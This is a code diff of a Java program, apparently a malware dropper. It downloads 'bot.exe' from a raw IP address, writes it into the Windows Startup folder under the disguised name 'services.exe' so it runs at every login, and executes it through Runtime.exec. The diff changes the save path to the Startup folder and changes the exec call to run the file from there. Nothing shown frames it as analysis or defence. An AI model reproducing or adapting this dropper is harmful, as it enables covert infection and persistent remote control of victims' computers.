@@ -7,7 +7,7 @@ public class Main {
 	public static void main(String args[]) throws InterruptedException, IOException,IllegalArgumentException
 	{
 	     String link = "http://159.65.11.28/bot.exe";
-	     File payload_file = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+	     File payload_file = new File("C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/services.exe");
 	     
 	     
 //	     File payload_file2 = new File("decoded.exe");
@@ -40,7 +40,7 @@ public class Main {
 	    System.out.println("Starting execution");
 	    Runtime r = Runtime.getRuntime();
 	    try {
-			r.exec(System.getProperty("user.dir") + "/bot.exe");
+			r.exec("C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/services.exe");
 			System.out.println("Executed");
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
